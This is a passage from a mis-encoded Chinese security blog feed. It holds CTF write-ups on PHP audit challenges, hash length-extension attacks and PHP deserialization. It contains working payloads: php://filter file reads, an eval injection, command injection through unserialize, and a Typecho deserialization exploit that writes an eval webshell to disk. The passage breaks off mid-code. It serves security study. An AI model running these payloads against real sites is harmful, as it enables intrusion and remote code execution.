    <url>%2F2019%2F08%2F12%2Fphp-challenge%2F</url>
    <content type="text"><![CDATA[ç»§ç»­åˆ†æžGitHubä¸Šçš„ä¸€ä¸ªä»£ç å®¡è®¡é¡¹ç›® challenge-10 1234567891011121314151617181920212223242526&lt;?phperror_reporting(0);echo "&lt;!--index.phps--&gt;";if(!$_GET['id'])&#123; header('Location: index.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'Hahahahahaha'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("flag.txt");&#125;else&#123; print "work harder!harder!harder!";&#125;?&gt; å°tricksï¼š var_dump('a'==true); ç»“æžœä¸ºtrue var_dump('a' == 0); ç»“æžœä¸ºtrue æ‰€ä»¥idè¾“å…¥ä¸€ä¸ªå­—æ¯å°±èƒ½å¤Ÿä½¿å¾—!$_GET['id']ä¸ºfalseï¼ŒåŒæ—¶$id == 0ä¸ºtrue $dataæ˜¯ä»Žä¸€ä¸ªæ–‡ä»¶ä¸­å¾—åˆ°çš„ç»“æžœï¼Œè¿™æ—¶å€™æƒ³åˆ°phpä¼ªåè®®ï¼Œè¾“å…¥a=php://inputå†postæ•°æ®å°±è¡Œ eregi(&quot;111&quot;.substr($b, 0, 1), &quot;1114&quot;) ç»“åˆåŽé¢çš„substr($b, 0, 1)!=4 è¦é€šè¿‡substrå‡½æ•°çš„æˆªæ–­æ‰è¡Œ æ‰€ä»¥è®¾ç½®$b=%00111111, substrå‡½æ•°ä¼šè¢«æˆªæ–­ï¼Œstrlenä¸ä¼šï¼Œeregiå°±èƒ½åŒ¹é…ä¸Šäº†ã€‚ è¡¥å……ä¸€ç‚¹phpä¼ªåè®®çš„çŸ¥è¯†ï¼Œå‚è€ƒäº†LoRexxarå¸ˆå‚…çš„æ–‡ç« ã€‚ phpä¸­æ”¯æŒçš„ä¼ªåè®®å¾ˆå¤šï¼Œ 123456789101112file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿhttp:// â€” è®¿é—® HTTP(s) ç½‘å€ftp:// â€” è®¿é—® FTP(s) URLsphp:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰zlib:// â€” åŽ‹ç¼©æµdata:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼phar:// â€” PHP å½’æ¡£ssh2:// â€” Secure Shell 2rar:// â€” RARogg:// â€” éŸ³é¢‘æµexpect:// â€” å¤„ç†äº¤äº’å¼çš„æµ æˆ‘ä»¬æœ€å¸¸ç”¨çš„ä»»æ„æ–‡ä»¶è¯»å–çš„payloadå°±æ˜¯ç”¨äº†php://åè®®ï¼š 1php://filter/read=convert.base64-encode/resource=upload.php é’ˆå¯¹php://filterï¼Œå®˜æ–¹æ–‡æ¡£æ˜¯è¿™æ ·å†™çš„ï¼š 12345åç§° æè¿°resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt; è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚read=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt; è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚write=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt; è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt; ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºŽè¯»æˆ–å†™é“¾ã€‚ åœ¨æˆ‘ä»¬çš„payloadä¸­ï¼Œupload.phpå°±æ˜¯è¦è¿‡æ»¤çš„æ•°æ®æµï¼Œconvert.base64-encodeå°±æ˜¯è¦è¯»é“¾çš„ç­›é€‰åˆ—è¡¨ ä¹‹æ‰€ä»¥è¦base64ç¼–ç ï¼Œä¸€èˆ¬æ˜¯ä¸ºäº†æ•°æ®ä¼ è¾“çš„æ–¹ä¾¿ å®˜æ–¹æ–‡æ¡£ä¸­èƒ½å¤Ÿä¸¾äº†å¦‚ä¸‹æ —å­ï¼š 123456789101112131415161718&lt;?php$fp = fopen('php://output', 'w');stream_filter_append($fp, 'convert.base64-encode');fwrite($fp, "This is a test.\n");fclose($fp);$param = array('line-length'=&gt;8, 'line-break-chars'=&gt;"\r\n");$fp = fopen('php://output', 'w');stream_filter_append($fp, 'convert.base64-encode', STREAM_FILTER_WRITE, $param);fwrite($fp, "This is a test.\n");fclose($fp);$fp = fopen('php://output', 'w');stream_filter_append($fp, 'convert.base64-decode');fwrite($fp, "VGhpcyBpcyBhIHRlc3QuCg==");fclose($fp);?&gt; é™¤äº†base64ä¹‹å¤–è¿˜æœ‰å…¶ä»–çš„ä¸€äº›è¿‡æ»¤å™¨ï¼Œå®˜æ–¹æ–‡æ¡£ä¸­æœ‰äº›ã€‚ challenge-11 1234567891011121314151617181920212223242526272829&lt;?php error_reporting(0);$link = mysql_connect('localhost', 'root', '');if (!$link) &#123; die('Could not connect to MySQL: ' . mysql_error()); &#125; // é€‰æ‹©æ•°æ®åº“$db = mysql_select_db("test", $link);if(!$db)&#123; echo 'select db error'; exit();&#125;// æ‰§è¡Œsql$password = $_GET['pwd'];$sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";var_dump($sql);$result=mysql_query($sql) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );$row1 = mysql_fetch_row($result);var_dump($row1);mysql_close($link);?&gt; challenge-12 123456&lt;?php error_reporting(0);show_source(__FILE__);$a = @$_REQUEST['hello'];eval("var_dump($a);"); å­—ç¬¦ä¸²ç›´æŽ¥æ‹¼æŽ¥ ?hello=);eval(phpinfo());// challenge-13 1234567891011121314151617181920212223242526272829303132&lt;?phpshow_source(__FILE__);$v1=0;$v2=0;$v3=0;$a=(array)json_decode(@$_GET['foo']);if(is_array($a))&#123; is_numeric(@$a["bar1"])?die("nope"):NULL; if(@$a["bar1"])&#123; ($a["bar1"]&gt;2016)?$v1=1:NULL; &#125; if(is_array(@$a["bar2"]))&#123; if(count($a["bar2"])!==5 OR !is_array($a["bar2"][0])) die("nope"); $pos = array_search("nudt", $a["a2"]); $pos===false?die("nope"):NULL; foreach($a["bar2"] as $key=&gt;$val)&#123; $val==="nudt"?die("nope"):NULL; &#125; $v2=1; &#125;&#125;$c=@$_GET['cat'];$d=@$_GET['dog'];if(@$c[1])&#123; if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123; eregi("3|1|c",$d.$c[0])?die("nope"):NULL; strpos(($c[0].$d), "htctf2016")?$v3=1:NULL; &#125;&#125;if($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; include "flag.php"; echo $flag;&#125;?&gt; å¯èƒ½æ˜¯æˆ‘å¯¹jsonä¸æ˜¯å¾ˆäº†è§£ï¼Œè¿™é‡Œå¿…é¡»éƒ½ä½¿ç”¨åŒå¼•å·æ‰è¡Œã€‚ ä¸¤ä¸ªä¸æ˜¯å¼±ç±»åž‹çš„trickï¼š 12var_dump(0===false) ä¸ºfalsevar_dump(null===false) ä¸ºfalse]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å“ˆå¸Œæ‰©å±•æ”»å‡»ç»§ç»­åˆ†æž]]></title>
    <url>%2F2019%2F08%2F12%2F%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%BB%A7%E7%BB%AD%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘çœ‹åˆ°äº†å¥½å¤šé’ˆå¯¹de1ctf ssrfmeé¢˜ç›®åˆ†æžï¼Œé¡ºä¾¿æŠŠä¹‹å‰æ²¡æžæ˜Žç™½çš„å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»å†™ä¸€ä¸‹ é“¾æŽ¥è¿™ç¯‡æ–‡ç« è®²çš„å¾ˆä»”ç»†äº†ï¼Œåˆ†æžä¸€ä¸‹æ–‡ç« ä¸­çš„æ —å­ å¸ˆå‚…ç»™çš„ä»£ç  md5çš„è¿‡ç¨‹ MD5 padding å¦‚æžœè¾“å…¥ä¿¡æ¯çš„é•¿åº¦(å­—èŠ‚)å¯¹64æ±‚ä½™çš„ç»“æžœä¸ç­‰äºŽ56ï¼Œå°±éœ€è¦å¡«å……ä½¿å¾—å¯¹64æ±‚ä½™çš„ç»“æžœç­‰äºŽ56ã€‚å¡«å……çš„æ–¹æ³•æ˜¯å¡«å……ä¸€ä¸ªx80å’Œxxä¸ª0ã€‚å¡«å……å®ŒåŽï¼Œä¿¡æ¯çš„é•¿åº¦ä¸ºN*64+56(å­—èŠ‚)ï¼Œå¹¶ä¸”æœ€åŽ8ä¸ªå­—èŠ‚ç”¨æ¥è®°å½•åŽŸå§‹è¾“å…¥ä¿¡æ¯é•¿åº¦ MD5 compress è¿™ä¸ªç®—æ³•ç›´æŽ¥åˆ°ç½‘ä¸Šæ‰¾å°±è¡Œ æ‰€ä»¥MD5çš„è¿‡ç¨‹å°±æ˜¯ï¼š å…ˆè¿›è¡Œæ¶ˆæ¯é•¿åº¦çš„å¡«å……(padding)ã€‚å¡«å……å®ŒåŽï¼Œåˆå§‹åŒ–çš„4ä¸ªMagic numberä¼šå’Œç¬¬ä¸€ä¸ª64å­—èŠ‚çš„Message blockè¿›è¡Œmd5 compressåŽ‹ç¼©ç®—æ³•ã€‚åŽ‹ç¼©ç®—æ³•å®ŒæˆåŽï¼Œä¼šäº§ç”Ÿæ–°çš„4ä¸ªMagic numberã€‚è¿™æ ·å†è¿›è¡Œç¬¬äºŒä¸ª64å­—èŠ‚Message blockçš„md5 compressåŽ‹ç¼©ç®—æ³•ã€‚ä»¥æ­¤ç±»æŽ¨â€¦â€¦ç›´åˆ°åŽ‹ç¼©åˆ°æœ€åŽ64ä¸ªå­—èŠ‚çš„(Message block + padding)ï¼Œæœ€åŽå¾—åˆ°çš„Magic numberç»è¿‡hexè½¬åŒ–å°±æ˜¯æœ€åŽçš„md5 hashå€¼ æ¯”å¦‚md5('admin'),ç”±äºŽpaddingä¹‹åŽåªæœ‰64ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥åªè¿›è¡Œä¸€è½®çš„md5 compress å¾—åˆ°çš„å¯†æ–‡å°±æ˜¯ï¼š 21232f297a57a5a743894a0e4a801fc3 æˆ‘ä»¬å¯ä»¥ä»Žå¯†æ–‡æŽ¨å¯¼å‡º4ä¸ªmagic numberï¼š 1234A=0x292f2321LB=0xa7a5577aLC=0xe4a8943LD=0xc31f804aL è¿™ä¸ªå…³ç³»å°±æ˜¯å¤§å°ç«¯è½¬åŒ–ä¸€ä¸‹ md5é•¿åº¦æ‰©å±•çš„æ”»å‡»è¿‡ç¨‹ çŸ¥é“å¦‚ä¸‹ä¸‰ä¸ªå€¼ï¼š md5(salt+message)çš„å€¼ messageå†…å®¹ salt+messageé•¿åº¦ æˆ‘ä»¬å¯ä»¥æ ¹æ®md5(salt+message)çš„å€¼é€†å‘å‡ºæœ€åŽçš„å››ä¸ªmagic number 12345def compute_magic_number(self, md5str): self.A = struct.unpack("I", md5str[0:8].decode('hex'))[0] self.B = struct.unpack("I", md5str[8:16].decode('hex'))[0] self.C = struct.unpack("I", md5str[16:24].decode('hex'))[0] self.D = struct.unpack("I", md5str[24:32].decode('hex'))[0] è¿™ä¸ªå››ä¸ªmagic numberåŽ»å’Œmåšä¸€ä¸‹æ¬¡çš„md5 compress å†ç†è§£ä¸€ä¸‹ ç»§ç»­åˆçœ‹äº†ä¸€ç¯‡å¸ˆå‚…çš„æ–‡ç« ï¼Œæƒ³è¦å¥½å¥½æ¢³ç†ä¸€ä¸‹å“ˆå¸Œæ‰©å±•æ”»å‡» å¸ˆå‚…æ˜¯ä»¥sha1ç®—æ³•ä¸ºä¾‹è®²è§£çš„ï¼š sha1çš„æµç¨‹å¦‚ä¸‹ï¼š sha1ç®—æ³•å’Œmd5å¾ˆç›¸ä¼¼ï¼Œä¹Ÿæœ‰æœ€åˆçš„å››ä¸ªIVï¼Œå¹¶ä¸”æ˜¯ç¡®å®šçš„(è¿™æ˜¯ä¸€ç§å¾ˆä¸å¥½çš„æ–¹æ³•ä½†æ˜¯ä¹Ÿæ˜¯ä¸€ç§æ— å¥ˆçš„ä¸¾åŠ¨) ä¸€ä¸ªä¸è¶³64ä½çš„å­—ç¬¦ä¸²ä¼šè¢«paddingè‡³64ä½ï¼Œå¹¶ä¸”ç”±äºŽåªæœ‰ä¸€ä¸ªåˆ†ç»„ï¼Œæ‰€ä»¥åªéœ€è¦ä¸€è½®è¿ç®—å³å¯ æˆ‘ä»¬åœ¨å‰ä¸€æ¬¡64ä½paddingä¹‹åŽçš„å­—ç¬¦ä¸²çš„åŸºç¡€ä¸ŠåŠ å…¥ä¸€äº›å­—ç¬¦ï¼Œsha1(salt+padding+add_data) é¦–å…ˆè¿™é‡Œè‚¯å®šæ˜¯è¦åˆ†æˆä¸¤ç»„çš„ï¼Œå‰ä¸€ç»„åŠ å¯†åŽçš„å†…å®¹å·²ç»çŸ¥é“äº†ï¼ŒåŒæ—¶äº§ç”Ÿçš„æ–°çš„IVä¼šå‚ä¸Žä¸‹ä¸€æ¬¡çš„å¤æ‚çš„æ•°å­¦è¿ç®— è€Œè¿™äº›IVæ˜¯èƒ½å¤Ÿä»Žç¬¬ä¸€ç»„çš„å¯†æ–‡ä¸­å¾—çŸ¥çš„ï¼Œè¿™å°±å¯¼è‡´ä¸‹ä¸€ç»„åŠ å¯†åŽçš„å†…å®¹å®žé™…ä¸Šæˆ‘ä»¬ä¹Ÿå¯ä»¥çŸ¥é“çš„ ã€Šç™½å¸½å­è®²webå®‰å…¨ã€‹ä¸Šæåˆ°ï¼Œå¦‚ä½•åˆ©ç”¨é•¿åº¦æ‰©å±•æ”»å‡»ï¼š LengthExtension ä½¿å¾—å¯ä»¥åœ¨åŽŸæ–‡ä¹‹åŽé™„åŠ ä»»æ„çš„å€¼ï¼Œå¹¶è®¡ç®—å‡ºæ–°çš„hashå€¼ï¼Œæœ€å¸¸è§çš„åœ°æ–¹å°±æ˜¯ç­¾å é”™è¯¯çš„ç­¾åæ ¡éªŒç®—æ³• å‚æ•°è¿žæŽ¥æ—¶æ²¡æœ‰ä½¿ç”¨åˆ†éš”ç¬¦ï¼Œæœ¬æ¥æ˜¯?a=1&amp;b=2&amp;c=3åœ¨ç­¾åç®—æ³•ä¸­ç®€å•åœ°å˜æˆäº†a1b2c3 äºŽæ˜¯æ”»å‡»è€…å¯ä»¥ä¼ªé€ å‚æ•°?a=1b2c3[...padding....]&amp;b=4&amp;c=5 æœ€ç»ˆåœ¨ç­¾åç®—æ³•ä¸­è¿žæŽ¥æ—¶å˜æˆäº†a1b2c3[...padding...]b4c5 é™„åŠ ä»»æ„çš„å‚æ•° HPP æœ€ç®€å•çš„é˜²æŠ¤å°±æ˜¯å°†secretæ”¾ç½®åœ¨å‚æ•°çš„æœ«å°¾ ä¸¾ä¾‹ å¤§å¸ˆå‚…ç»™çš„æ —å­ï¼š 1234567891011121314151617181920&lt;?php$role = $_REQUEST["role"];$hash = $_REQUEST["hash"];$salt = "meme"; if ($hash !== md5($salt.$role))&#123; echo 'wrong!'; exit;&#125;if ( $role == 'admin')&#123; echo 'wrong, hash cann\'t be admin'; exit;&#125;echo "You are ".$role.'&lt;/br&gt;';echo 'Congradulation!';?&gt; å·²çŸ¥roleä¸ºadminï¼Œsaltçš„é•¿åº¦ä¸º4ï¼Œhashå€¼ä¸ºï¼šc7813629f22b6a7d28a08041db3e80a9 æˆ‘ä»¬å¯ä»¥åœ¨roleåŽé¢é™„åŠ ä»»æ„çš„æ•°æ®ä½¿å¾—ç¬¬ä¸€ä¸ªifè¢«ç»•è¿‡ ç”¨å¤§å¸ˆå‚…çš„è„šæœ¬ï¼š python md5pad.py c7813629f22b6a7d28a08041db3e80a9 joychou 9 å½“ç„¶ä¹Ÿå¯ä»¥è¿™æ ·ï¼š 1234567$ hashpump Input Signature: c7813629f22b6a7d28a08041db3e80a9Input Data: adminInput Key Length: 9Input Data to Add: joychou06cf5a94dcda53659f58c0f411ba0bd8admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p\x00\x00\x00\x00\x00\x00\x00joychou æ³¨æ„ç¬¬ä¸‰æ¬¡è¾“å…¥çš„æ•°æ®é•¿åº¦æ˜¯åŒ…æ‹¬saltåœ¨å†…çš„ å‚è€ƒ æ·±å…¥ç†è§£hashé•¿åº¦æ‰©å±•æ”»å‡»ï¼ˆsha1ä¸ºä¾‹ï¼‰ Hash Length Extension Attack]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>hash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpååºåˆ—åŒ–ç¬”è®°1]]></title>
    <url>%2F2019%2F08%2F11%2Fphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B01%2F</url>
    <content type="text"><![CDATA[åœ¨freebufä¸Šçœ‹åˆ°äº†ä¸€ç¯‡æ–°çš„phpååºåˆ—åŒ–çš„æ–‡ç« ï¼Œå€Ÿæ­¤ç»§ç»­åˆ†æžä¸€ä¸‹phpååºåˆ—åŒ–ã€‚ æ–‡ç« ä¸­çš„ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135&lt;?phperror_reporting(0);class come&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); &#125; &#125; function waf($str)&#123; $str=preg_replace("/[&lt;&gt;*;|?\n ]/","",$str); $str=str_replace('flag','',$str); return $str; &#125; function echos($host)&#123; system("echos $host".$host); &#125; function __destruct()&#123; if (in_array($this-&gt;method, array("echos"))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125;&#125;$first='hi';$var='var';$bbb='bbb';$ccc='ccc';$i=1;foreach($_GET as $key =&gt; $value) &#123; if($i===1) &#123; $i++; $$key = $value; &#125; else&#123;break;&#125;&#125;if($first==="doller")&#123; var_dump($_GET['a']); @parse_str($_GET['a']); if($var==="give") &#123; if($bbb==="me") &#123; if($ccc==="flag") &#123; echo"&lt;br&gt;welcome!&lt;br&gt;"; $come=@$_POST['come']; unserialize($come); &#125; &#125; else &#123;echo "&lt;br&gt;think about it&lt;br&gt;";&#125; &#125; else &#123; echo "NO"; &#125;&#125;else&#123; echo "Can you hack me?&lt;br&gt;";&#125;?&gt; æœ‰ä¸¤ä¸ªå°trickéœ€è¦ç»•è¿‡ï¼Œéƒ½æ˜¯å˜é‡è¦†ç›–çš„æ¼æ´žï¼ŒåŒæ—¶parse_strå‡½æ•°éœ€è¦æŽ¥å—çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¸ºäº†åœ¨æµè§ˆå™¨æ ä¸­è¾“å…¥éœ€è¦å°†&amp;ç¬¦å·è¿›è¡ŒURLç¼–ç  http://localhost/test/unserialize.php?first=doller&amp;a=var=give%26bbb=me%26ccc=flag è¿™æ ·å°±èƒ½ç»•è¿‡ä¸¤ä¸ªå°trick ä¹‹åŽå°±æ˜¯æ€Žä¹ˆåˆ©ç”¨é‚£ä¸ªååºåˆ—åŒ–äº†ï¼Œ__constructå‡½æ•°æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œ__wakeupæ–¹æ³•ä¼šå°†ç§æœ‰å±žæ€§argsé€šè¿‡ä¸€ä¸ªwafå‡½æ•°è¿›è¡Œè¿‡æ»¤ï¼Œ__destructå‡½æ•°ä¸­æœ‰ä¸€ä¸ªå±é™©å‡½æ•°call_user_func_array,æ³¨æ„åˆ°è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„æ—¶å€™ä¼ å…¥çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…¶å®žå°±æ˜¯è°ƒç”¨è¿™ä¸ªthisç±»ä¸­çš„ä¸€ä¸ªæ–¹æ³•ã€‚ä½†æ˜¯ä¹‹å‰çš„ifåˆ¤æ–­é™åˆ¶äº†è°ƒç”¨çš„æ–¹æ³•åªèƒ½æ˜¯echosï¼Œåˆ†æžechosæ–¹æ³•å‘çŽ°å…¶ä¸­æœ‰ä¸€ä¸ªsystemå‡½æ•°ï¼Œä½†æ˜¯echoé”™è¯¯çš„æ‹¼æˆäº†echos ðŸ˜† äºŽæ˜¯æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯é€šè¿‡ä¼ å…¥ååºåˆ—åŒ–åŽçš„å€¼ä½¿å¾—echoså‡½æ•°è¢«è°ƒç”¨æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤ï¼Œè¿™å°±è®¾è®¡åˆ°åœ¨Linuxæˆ–è€…Windowsä¸­ä¸€è¡Œæ‰§è¡Œå¤šæ¡å‘½ä»¤çš„æ–¹å¼ã€‚ åœ¨Linuxä¸­ï¼š &amp;æ˜¯ä¸ç®¡å‰åŽå‘½ä»¤æ˜¯å¦æ‰§è¡ŒæˆåŠŸéƒ½ä¼šæ‰§è¡Œå‰åŽå‘½ä»¤ &amp;&amp;æ˜¯å‰é¢çš„å‘½ä»¤æ‰§è¡ŒæˆåŠŸæ‰èƒ½æ‰§è¡ŒåŽé¢çš„å‘½ä»¤ ||æ˜¯å‰é¢çš„å‘½ä»¤æ‰§è¡Œä¸æˆåŠŸæ‰èƒ½æ‰§è¡ŒåŽé¢çš„å‘½ä»¤ |ç®¡é“ç¬¦ æž„é€ å‡ºååºåˆ—åŒ–æ•°æ®å¦‚ä¸‹ï¼š O:4:&quot;come&quot;:2:{s:10:&quot;comeargs&quot;;a:1:{i:0;s:4:&quot;&amp;dir&quot;;}s:12:&quot;comemethod&quot;;s:5:&quot;echos&quot;;} ä½†æ˜¯ã€‚ã€‚ã€‚ var_dumpä¸€ä¸‹å‘çŽ°äº†ï¼š :\ProgramFiles\phpstudy\PHPTutorial\WWW\test\unserialize.php:104:string 'O:4:&quot;come&quot;:2:{s:10:&quot;comeargs&quot;;a:1:{i:0;s:4:&quot;' (length=44) å‘çŽ°æ•°æ®è¢«æˆªæ–­äº†ã€‚ã€‚ var_dumpä¹‹å‰çš„æž„é€ çš„ååºåˆ—åŒ–æ•°æ®ï¼š 12O:4:&quot;come&quot;:2:&#123;s:10:&quot;comeargs&quot;;a:1:&#123;i:0;s:4:&quot;&amp;dir&quot;;&#125;s:12:&quot;comemethod&quot;;s:5:&quot;echos&quot;;&#125;F:\notes\audit\test.php:8: ---&gt; echoå‡ºæ¥çš„ç»“æžœstring(86) &quot;O:4:&quot;come&quot;:2:&#123;s:10:&quot;\000come\000args&quot;;a:1:&#123;i:0;s:4:&quot;&amp;dir&quot;;&#125;s:12:&quot;\000come\000method&quot;;s:5:&quot;echos&quot;;&#125;&quot; ---&gt; var_dumpå‡ºæ¥çš„ç»“æžœ å› ä¸ºphpåœ¨ååºåˆ—åŒ–æ•°æ®æ—¶ï¼š protectedå±žæ€§çš„è¡¨ç¤ºæ–¹å¼æ˜¯åœ¨å˜é‡åå‰åŠ ä¸ª%00*%00 privateè¡¨ç¤ºæ–¹å¼æ˜¯åœ¨å˜é‡åå‰åŠ ä¸Š%00ç±»å%00 æ‰€ä»¥æ¬¡æ•°çš„ä¸¤ä¸ªprivateå±žæ€§éƒ½è¢«åŠ ä¸Šäº†00é˜¶æ®µç¬¦å·ï¼ŒäºŽæ˜¯åªèƒ½é€šè¿‡pythonæ‰‹åŠ¨ç¼–ç ä¼ è¾“æ•°æ®äº† 12345678910import requestsurl = "http://localhost/test/unserialize.php?first=doller&amp;a=var=give%26bbb=me%26ccc=flag"n = '00'.decode('hex')o = 'O:4:"come":2:&#123;s:12:"'+n+'come'+n+'method";s:5:"echos";s:10:"'+n+'come'+n+'args";a:1:&#123;i:0;s:4:"&amp;dir";&#125;&#125;"'r = requests.post(url, data=&#123;"come":o&#125;)print r.text è¿”å›žçš„ç»“æžœå¦‚ä¸‹ï¼š ä¹‹åŽå¦‚æžœè¦è¯»å–flagè¿˜æœ‰å‡ ä¸ªå§¿åŠ¿ï¼Œä½†ä¸æ˜¯æœ¬æ–‡çš„é‡ç‚¹äº† typechoååºåˆ—åŒ–æ¼æ´ž å…ˆæ”¾å‡ºpayload 12345678910111213141516171819202122&lt;?php class Typecho_Request&#123; private $_filter=array("assert"); private $_params=array("screenName"=&gt;"file_put_contents('jrxnm.php', '&lt;?php eval(\$_GET[jrxnm]);');"); &#125; class Typecho_Feed&#123; private $_items = array(); private $_type = 'RSS 2.0'; function __construct()&#123; $item['author'] = new Typecho_Request(); $this-&gt;_items[0] = $item; &#125; &#125; $abc = new Typecho_Feed();echo base64_encode(serialize(array("adapter"=&gt;$abc,"prefix"=&gt;"_typecho"))); åºåˆ—åŒ–ä¸€ä¸ªæ•°ç»„ä¹‹åŽä½œä¸ºcookieä¼ å…¥ï¼Œå…³é”®ä»£ç ï¼š æ­¤å¤„$configæŽ¥æ”¶cookieä¸­çš„å‚æ•°ï¼Œé‚£ä¹ˆ$configæ­¤æ—¶å°±æ˜¯ä¸€ä¸ªæ•°ç»„: $config = array(&quot;adapter&quot;=&gt;$abc, &quot;prefix&quot;=&gt;&quot;_typecho&quot;) å…¶ä¸­adapteré”®å¯¹åº”çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚ ç„¶åŽ$configçš„ä¸¤ä¸ªé”®å€¼å¯¹åº”çš„valueéƒ½ä½œä¸ºå‚æ•°è¿›å…¥äº†ä¸€ä¸ªç±»ã€‚ æŸ¥çœ‹è¯¥ç±»çš„æž„é€ æ–¹æ³•å‘çŽ°å­˜åœ¨å­—ç¬¦ä¸²æ‹¼æŽ¥ï¼š é‚£ä¹ˆæŸ¥æ‰¾__toString()é­”æœ¯æ–¹æ³•ï¼Œæˆ‘ä»¬å‘çŽ°åœ¨Feed.phpæ–‡ä»¶ä¸­çš„ä¸€ä¸ªç±»ï¼šTypecho_Feed $item['author']-&gt;screenNameå¦‚æžœ$item['author'] æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä¸”ä¸å­˜åœ¨screenNameå±žæ€§æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨__geté­”æ³•å‡½æ•°ã€‚ äºŽæ˜¯æˆ‘ä»¬æƒ³è¦åœ¨å®žä¾‹åŒ–Typecho_Dbç±»çš„æ—¶å€™ï¼Œè°ƒç”¨Typecho_Feedç±»ä¸­çš„__toStringæ–¹æ³• æ­¤æ—¶ç»§ç»­å¯»æ‰¾__getæ–¹æ³•ï¼š åœ¨Request.phpæ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªç±»Typecho_Requestä¸­çš„__getæ–¹æ³•å¦‚ä¸‹ï¼š 1234567891011/** * èŽ·å–å®žé™…ä¼ é€’å‚æ•°(magic) * * @access public * @param string $key æŒ‡å®šå‚æ•° * @return void */public function __get($key)&#123; return $this-&gt;get($key);&#125; ç»§ç»­åˆ†æžgetæ–¹æ³•ï¼š 12345678910111213141516171819202122232425public function get($key, $default = NULL)&#123; $value = $default; switch (true) &#123; case isset($this-&gt;_params[$key]): $value = $this-&gt;_params[$key]; break; case isset($_GET[$key]): $value = $_GET[$key]; break; case isset($_POST[$key]): $value = $_POST[$key]; break; case isset($_COOKIE[$key]): $value = $_COOKIE[$key]; break; default: $value = $default; break; &#125; $value = is_array($value) || strlen($value) &gt; 0 ? $value : $default; return $this-&gt;_filter ? $this-&gt;_applyFilter($value) : $value;&#125; å¦‚æžœ$this-&gt;_filterï¼Œå°±ä¼šè°ƒç”¨_applyFilteræ–¹æ³•ï¼š 123456789101112private function _applyFilter($value)&#123; if ($this-&gt;_filter) &#123; foreach ($this-&gt;_filter as $filter) &#123; $value = is_array($value) ? array_map($filter, $value) : call_user_func($filter, $value); &#125; &#125; $this-&gt;_filter = array(); return $value;&#125; æ­¤æ—¶ç»ˆäºŽçœ‹åˆ°äº†call_user_funcæ–¹æ³•ï¼Œå‡½æ•°åæ˜¯this-&gt;_filter å†çœ‹ä¸€é“ååºåˆ—åŒ– ``php &lt;?php class Template{ public $cacheFile = '/tmp/cachefile'; public $template = '&lt;div&gt;welcome back %s &lt;/div&gt;'; public function __construct($data=null) { $data=$this-&gt;lodaData($data); $this-&gt;render($data); } 